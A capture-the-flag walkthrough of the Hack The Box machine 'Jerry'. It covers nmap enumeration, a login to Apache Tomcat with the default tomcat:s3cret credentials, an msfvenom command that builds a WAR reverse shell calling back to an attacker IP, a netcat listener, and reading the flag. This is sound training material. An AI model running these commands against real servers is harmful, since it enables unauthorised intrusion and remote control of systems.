---
layout: default
title: JERRY
description: by Hack The Box
---

<h3 align="center">

</h3>

# Enumeration

1. Nmap

   ```
   └─$ nmap -T4 10.10.10.95 -A -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 17:45 EST
   Nmap scan report for 10.10.10.95
   Host is up (0.031s latency).
   Not shown: 999 filtered tcp ports (no-response)
   PORT     STATE SERVICE VERSION
   8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
   |_http-favicon: Apache Tomcat
   |_http-title: Apache Tomcat/7.0.88
   |_http-open-proxy: Proxy might be redirecting requests
   |_http-server-header: Apache-Coyote/1.1

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
   ```

2. So port 8080 is open, its a tomcat webserver. Opening the website using http://10.10.10.95:8080/ we get redirected to the tomcat website. I tried to login with default username/password of admin:admin by click server status but it failed... but wait!!!

# FootHold

3. After a failed attemp in logging in as admin:admin, it took me to a 404 page saying that the default password for tomcat is username: tomcat and password: s3cret . I was like ok, I'll try that.
4. Wow! that was the easiest foothold ever!
5. Now navigating around the website I found that I can upload a file, great!
6. Googling for WAR file type reverse shell I came to a github page that has a one-liner to create a payload using MSFVENOM
   ```
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > exploit.war
   ```
   - Change the LHOST and LPORT according to your IP and listener port
   - This has to be done from a root user, doing the command even with SUDO doesnt cut it, not sure why.
7. Now, let me setup a listener with netcat
   ```
   nc -nvlp 4444
   ```
8. Upload the file. Then it will show in the list of applications. Click the upload file and this will take you to a blank page but will also activate your reverse shell
9. From here we just traverse the directory. Found a flag inside C:\Users\Administrator\Desktop\flag
10. Something extra I had to do is, I had to do this
    ```
    cp flags flag.txt
    ```
    then
    ```
    type flag.txt
    ```
11. Learned something new there. Both user and root flag is in that one flags file.

<br><br>

# Reference

1. https://www.exploit-db.com/exploits/42966
2. https://superuser.com/questions/434870/what-is-the-windows-equivalent-of-the-unix-command-cat
3. https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
4. @Butchy - for helping me realise to use ROOT rather keep bashing my head using SUDO

<br><br>

[back to HOME](./)
